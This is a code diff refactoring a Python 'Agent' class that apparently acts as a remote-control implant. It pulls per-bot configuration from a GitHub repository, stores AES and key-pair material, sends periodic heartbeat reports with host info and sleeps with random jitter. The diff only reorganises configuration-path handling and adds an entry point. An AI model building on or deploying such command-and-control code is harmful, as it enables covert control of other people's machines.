@@ -140,13 +140,14 @@ class Agent(object):
         self.owner = owner
         self.repo = repo
         self.branch = branch
-        self.conf_path = conf_path
+        self._conf_path = conf_path
         self.debug = debug
         # self.idle = True
         self.silent = False
         # self.last_active = time.time()
         self.failed_connections = 0
         self.conf = None
+        self.conf_sha = None
         self.gh_conf = None
         self.gh_result = None
         self.cmdpub = ''    # encode with hex
@@ -162,7 +163,6 @@ class Agent(object):
         self.run_task()
 
     def init(self):
-        self.conf_sha = None
         self.conf = self.get_conf_try(self.conf_url)
         if not self.conf:
             return
@@ -177,7 +177,7 @@ class Agent(object):
             self.gh_result = self.conf['RetAcc'].split('$$')
             self.ret_path = self.conf['RetPath']
             self.hbt = self.conf['HBTime']
-            self.conf_path = self.conf['ConfPath']
+            self._conf_path = self.conf['ConfPath']
             self.aes_key = self.conf['AesKey']
             self.cmdpub = self.conf['SrvPubKey']
             self.prikey = self.conf['ToyPriKey']
@@ -202,9 +202,13 @@ class Agent(object):
         return _base_url
 
     @property
+    def conf_path(self):
+        conf_path = '/'.join((self._conf_path, self.gid, self.uid + '.conf'))
+        return conf_path
+
+    @property
     def conf_url(self):
-        conf_path = '/'.join((self.conf_path, self.gid, self.uid + '.conf'))
-        return self.base_url + conf_path
+        return self.base_url + self.conf_path
 
     @property
     def report_base(self):
@@ -229,7 +233,7 @@ class Agent(object):
                 # self.report(str(time.time()), path, plain=True)
                 self.report(json.dumps(self.info), path, plain=True)
                 time.sleep(self.hbt)
-                if self.is_conf_update(self.conf_path, self.conf_sha):
+                if self.is_conf_update():
                     # self.init(self.conf_url)
                     self.parse_conf()
                     self.moudle_check()
@@ -544,3 +548,7 @@ class Agent(object):
                     pass
             # time.sleep(self.cf)
             time.sleep(random.randint(10, 50))
+
+
+if __name__ == '__main__':
+    Agent()
